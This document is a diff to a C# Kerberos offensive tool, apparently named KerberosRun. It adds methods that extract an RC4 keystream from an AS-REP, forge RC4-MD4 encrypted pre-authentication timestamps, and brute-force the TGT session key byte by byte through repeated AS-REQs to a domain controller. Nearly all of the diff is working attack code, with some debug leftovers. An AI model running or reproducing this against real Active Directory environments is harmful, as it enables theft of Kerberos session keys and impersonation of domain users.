@@ -17,10 +17,14 @@ using Kerberos.NET.Win32;
 using System.Security.Cryptography.Pkcs;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
+using System.IO;
+using System.Formats.Asn1;
+using System.Security.Cryptography.Asn1;
+using Kerberos.NET.Asn1;
 
 namespace KerberosRun
 {
-    public class TGT: KerberosService
+    public class TGT : KerberosService
     {
         internal KrbAsReq asReq;
         internal KrbAsRep asRep;
@@ -28,20 +32,37 @@ namespace KerberosRun
         private KrbEncAsRepPart asDecryptedRepPart;
         internal KrbEncryptionKey sessionKey;
         private KrbApReq krbApReq;
+        private byte[] keyStream;
         public AuthenticationOptions authOptions = AuthenticationOptions.RenewableOk |
                                             AuthenticationOptions.Canonicalize |
                                             AuthenticationOptions.Renewable |
                                             AuthenticationOptions.Forwardable |
                                             AuthenticationOptions.RepPartCompatible;
-        public TGT(): base()
+
+        private const int BASE_OFFSET = 0x18;
+        private const int KEY_OFFSET = BASE_OFFSET + 0x15;
+
+        public TGT() : base()
         {
             if (!KerberosRun.NoPAC) { authOptions |= AuthenticationOptions.IncludePacRequest; }
 
         }
 
 
-        public KrbAsReq AddPaData(List<KrbPaData> padataList)
+        public KrbAsReq AddPaData(List<KrbPaData> padataList, EncryptionType[] eType = null)
         {
+            if (eType == null)
+            {
+                if (KerberosRun.UseRC4)
+                {
+                    eType = new[] { EncryptionType.RC4_HMAC_NT };
+                }
+                else
+                {
+                    eType = KrbConstants.KerberosConstants.ETypes.ToArray();
+                }
+            }
+
             KdcOptions kdcOptions = (KdcOptions)(authOptions & ~AuthenticationOptions.AllAuthentication);
 
             KrbPaPacRequest pacRequest = new KrbPaPacRequest
@@ -69,7 +90,7 @@ namespace KerberosRun
                     Name = new[] { KerberosRun.User }// + "@" + domainName.ToUpper() }
                 },
 
-                EType = KerberosRun.UseRC4 ? new[] { EncryptionType.RC4_HMAC_NT } : KrbConstants.KerberosConstants.ETypes.ToArray(),
+                EType = eType, //KerberosRun.UseRC4 ? new[] { EncryptionType.RC4_HMAC_NT } : KrbConstants.KerberosConstants.ETypes.ToArray(),
                 KdcOptions = kdcOptions,
                 Nonce = KrbConstants.KerberosConstants.GetNonce(),
                 RTime = KrbConstants.KerberosConstants.EndOfTime,
@@ -92,7 +113,7 @@ namespace KerberosRun
         }
 
 
-        public KrbAsReq CreateAsReq()
+        public KrbAsReq CreateAsReq(EncryptionType[] eType = null)
         {
 
             List<KrbPaData> paDataList = new List<KrbPaData>
@@ -130,7 +151,7 @@ namespace KerberosRun
             }
 
 
-            asReq = AddPaData(paDataList);
+            asReq = AddPaData(paDataList, eType);
 
             return asReq;
         }
@@ -184,6 +205,204 @@ namespace KerberosRun
 
             return asReq;
         }
+
+
+        public byte[] BruteForceKey()
+        {
+            var watch = new System.Diagnostics.Stopwatch();
+            watch.Start();
+
+            for (int j = 0; j < 5; ++j)
+            {
+                bool foundKey = false;
+                Array.Resize(ref keyStream, keyStream.Length + 1);
+                for (int i = 0; i < 256; ++i)
+                {
+                    keyStream[keyStream.Length - 1] = (byte)i;
+
+                    var asReq = CreateAsReqUsingRC4MD4(null, BuildRC4MD4Timestamp(j, true, keyStream));
+
+                    var result = SendAsync(asReq).Result;
+
+                    if (!(result is KrbAsRep))
+                    {
+                        continue;
+                    }
+                    logger.Info("[!] Found key byte {0}.", j);
+                    foundKey = true;
+                    break;
+                }
+
+                if (!foundKey)
+                {
+                    logger.Equals("[x] Couldn't find next key stream byte.");
+                }
+            }
+
+            if (keyStream.Length < (KEY_OFFSET + 5))
+            {
+                throw new ArgumentException("Couldn't get enough key data.");
+            }
+
+            byte[] key = new byte[16];
+
+            for (int i = 0; i < 16; ++i)
+            {
+                if (i < 5)
+                    key[i] = (byte)(asRep.EncPart.Cipher.ToArray()[i + KEY_OFFSET] ^ keyStream[i + KEY_OFFSET]);
+                else
+                    key[i] = 0xAB;
+            }
+
+            watch.Stop();
+            logger.Info("[*] Brute forced TGT key {0} in {1} seconds.", Convert.ToBase64String(key), watch.ElapsedMilliseconds / 1000.0);
+
+            return key;
+        }
+
+
+        public byte[] Test()
+        {
+            var writer = new AsnWriter(AsnEncodingRules.DER);
+
+            var tag = Asn1Tag.Sequence;
+
+            writer.PushSequence(tag);
+
+            writer.PushSequence(new Asn1Tag(TagClass.ContextSpecific, 0));
+            writer.WriteGeneralizedTime(new DateTimeOffset(DateTime.UtcNow, TimeSpan.Zero));
+            writer.PopSequence(new Asn1Tag(TagClass.ContextSpecific, 0));
+            return writer.Encode();
+        }
+
+        public byte[] BuildRC4MD4Timestamp(int prefixLength, bool addNullChar, byte[] keyStream)
+        {
+            var ts = new KrbPaEncTsEnc()
+            {
+                PaTimestamp = new DateTimeOffset(DateTime.UtcNow, TimeSpan.Zero),
+            };
+
+            
+            var derArray = Test();
+
+
+            Console.WriteLine(ts.PaTimestamp.ToString("yyyyMMddHHmmssZ"));
+            Console.WriteLine(prefixLength);
+
+
+            //var derArray = ts.Encode().ToArray();
+            var rawderArray = new ArraySegment<byte>(derArray, 2, derArray.Length - 2).ToArray();
+            if (addNullChar)
+            {
+                Array.Resize<byte>(ref rawderArray, rawderArray.Length + 1);
+                rawderArray[rawderArray.Length - 1] = 0;
+            }
+
+            Console.WriteLine(BitConverter.ToString(rawderArray.ToArray()));
+            Console.ReadLine();
+            MemoryStream stm = new MemoryStream();
+            stm.Write(new byte[0x18], 0, 0x18);
+            stm.WriteByte(0x30);
+
+            byte[] ls = Utils.EncodeLength(rawderArray.Length, prefixLength);
+
+            stm.Write(ls, 0, ls.Length);
+            stm.Write(rawderArray, 0, rawderArray.Length);
+
+
+            var asReqCipher = stm.ToArray();
+
+
+            if (asReqCipher.Length > keyStream.Length)
+            {
+                logger.Error("[x] Not enough keystream to encode timestamp.");
+                Environment.Exit(1);
+            }
+
+            for (int i = 0; i < keyStream.Length; ++i)
+            {
+                byte k = keyStream[i];
+                if (i >= asReqCipher.Length)
+                    break;
+                asReqCipher[i] ^= k;
+            }
+            Console.WriteLine(BitConverter.ToString(asReqCipher.ToArray()));
+            Console.WriteLine("______________________________");
+            return asReqCipher;
+        }
+
+
+        public KrbAsReq CreateAsReqUsingRC4MD4(byte[] asRepCipher, byte[] asReqCipher = null)
+        {
+
+            List<KrbPaData> paDataList = new List<KrbPaData>
+            {
+                new KrbPaData
+                {
+                    Type = PaDataType.PA_PAC_REQUEST,
+                    Value = (new KrbPaPacRequest
+                    {
+                        IncludePac = authOptions.HasFlag(AuthenticationOptions.IncludePacRequest)
+                    }).Encode()
+                }
+            };
+
+            if (asRepCipher != null)
+            {
+                var ts = new KrbPaEncTsEnc()
+                {
+                    PaTimestamp = new DateTimeOffset(DateTime.UtcNow, TimeSpan.Zero),
+                    //PaUSec = now.Millisecond,
+                };
+
+                var encodedTs = ts.Encode();
+
+                int BASE_OFFSET = 0x18;
+                //int KEY_OFFSET = BASE_OFFSET + 0x15;
+
+                int decLength = asRepCipher.Length - BASE_OFFSET;
+
+                keyStream = new byte[] {
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x79, 0x82, 0xFF, 0xFF, 0x30, 0x82, 0xFF, 0xFF,
+                    0xA0, 0x1B, 0x30, 0x19, 0xA0, 0x03, 0x02, 0x01,
+                    0x80, 0xA1, 0x12, 0x04, 0x10
+                };
+
+                int tmpLength = decLength - 4;
+                keyStream[BASE_OFFSET + 2] = (byte)(tmpLength >> 8);
+                keyStream[BASE_OFFSET + 3] = (byte)tmpLength;
+
+                tmpLength -= 4;
+                keyStream[BASE_OFFSET + 6] = (byte)(tmpLength >> 8);
+                keyStream[BASE_OFFSET + 7] = (byte)tmpLength;
+
+                for (int i = 0; i < keyStream.Length; ++i)
+                {
+                    keyStream[i] ^= asRepCipher[i];
+                }
+
+                logger.Info("[!] KeyStream: {0}", BitConverter.ToString(keyStream));
+
+                asReqCipher = BuildRC4MD4Timestamp(0, false, keyStream);
+
+            }
+
+
+            paDataList.Add(new KrbPaData
+            {
+                Type = PaDataType.PA_ENC_TIMESTAMP,
+                Value = (new KrbEncryptedData { EType = EncryptionType.RC4_MD4, Cipher = asReqCipher }).Encode()
+            });
+
+
+            asReq = AddPaData(paDataList, new [] { EncryptionType.RC4_MD4 });
+
+            return asReq;
+        }
+
 
 
         //public override void Create()
@@ -311,19 +530,19 @@ namespace KerberosRun
         //}
 
 
-        public async Task<KrbAsRep> SendAsync(KrbAsReq asReq)
+        public async Task<object> SendAsync(KrbAsReq asReq)
         {
             if (KerberosRun.Cert != null)
             {
                 asyCred = cred as KrbCertCredential;
             }
 
-            logger.Info("[*] Starting Kerberos Authentication ...");
+            //logger.Info("[*] Starting Kerberos Authentication ...");
 
 
             try
             {
-                logger.Info("[*] Sending AS-REQ to {0}...", KerberosRun.DC);
+                //logger.Info("[*] Sending AS-REQ to {0}...", KerberosRun.DC);
 
                 asRep = await transport.SendMessage<KrbAsRep>(
                     KerberosRun.DC ?? KerberosRun.Domain,
@@ -332,7 +551,7 @@ namespace KerberosRun
             }
             catch (KerberosProtocolException pex)
             {
-                logger.Info("[x] {0}", pex.Message);
+                //logger.Info("[x] {0}", pex.Message);
 
                 if (pex?.Error?.ErrorCode == KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED)
                 {
@@ -353,7 +572,7 @@ namespace KerberosRun
                         asyCred.IncludePreAuthenticationHints(pex?.Error?.DecodePreAuthentication());
                     }
 
-                    return null;
+                    return pex;
 
                 }
                 else if (pex?.Error?.ErrorCode == KerberosErrorCode.KDC_ERR_PREAUTH_FAILED)
@@ -363,13 +582,13 @@ namespace KerberosRun
                 }
                 else
                 {
-                    logger.Error("[x] Authentication Stopped ...\n");
+                    //logger.Error("[x] Authentication Stopped ...\n");
                     requestFailed = true;
                 }
-                Environment.Exit(0);
+                return pex;
             }
 
-            logger.Info("[*] Receiving AS-REP...");
+            //logger.Info("[*] Receiving AS-REP...");
 
             return asRep;
         }
@@ -622,7 +841,6 @@ namespace KerberosRun
 
             sessionKey = krbCredPart.TicketInfo[0].Key;
 
-            
 
             bKirbi = Kirbi.GetKirbi(ticket, krbCredPart);
 
